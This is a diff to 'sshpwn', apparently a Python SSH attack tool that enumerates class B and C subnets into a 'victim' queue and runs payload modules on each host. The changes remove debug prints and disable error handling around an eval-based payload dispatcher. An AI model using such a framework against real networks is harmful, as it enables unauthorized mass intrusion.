@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# sshpwn v1.7
+# sshpwn v1.8
 
 # Copyright (c) 2016 Shawn Pang
 # http://shawnpang.com
@@ -12,6 +12,7 @@
 # Make more modules (download (with relative ~, splits "/" takes last as downloadfile name (one param))), upload, shutdown, fun stuff...)
 # Add more configurations to config file (default timeout, log level)
 # GUI improvements, better mode selection, greeting and time, flavour text
+# Whitelist feature
 
 import sys, os, time, threading
 import misc.coloredstatus as cs
@@ -181,7 +182,6 @@ def getvictimlist():
             
             # Class B Entire Network
             if subnets[0].count('.') == 2:
-                print("hit! class b network")
                 for subnet in subnets:
                     for i in range(255):
                         for k in range(255):
@@ -189,26 +189,22 @@ def getvictimlist():
             
             # Class B Network Range
             elif subnetrange:
-                print("hit! class b range")
                 for i in range(rangestart, rangeend):
                     for k in range(255):
                         q.put(firstoctet + '.' + secondoctet + '.' + str(i) + '.' + str(k))
             
             # Class C Entire Network
             elif subnets[0].count('.') == 3:
-                print("hit! class c")
                 for subnet in subnets:
                     for i in range(255):
                         q.put(subnet + str(i))
             
             # Class A currently not supported, too big
             else:
-                print("hit!")
                 print(cs.error, "Invalid ip subnet format!")
                 return None
 
             q.join()
-            print(q.empty())
             p.success("Done, took " + "{:.2f}".format(time.time() - start) + " seconds")
         # Threading End
 
@@ -334,12 +330,12 @@ def builtincmd(cmd, victims):
         return 2
 
 def execute(cmd, victim):
-    try:
-        context.log_level = log_level
-        result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
-    except NameError:
-        print(cs.error, "Payload not found!")
-        return 1
+    #try:
+    context.log_level = log_level
+    result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
+    #except NameError:
+     #   print(cs.error, "Payload not found!")
+      #  return 1
 
     if result == 0:
         print(cs.special, "Payload successful on", victim.host)
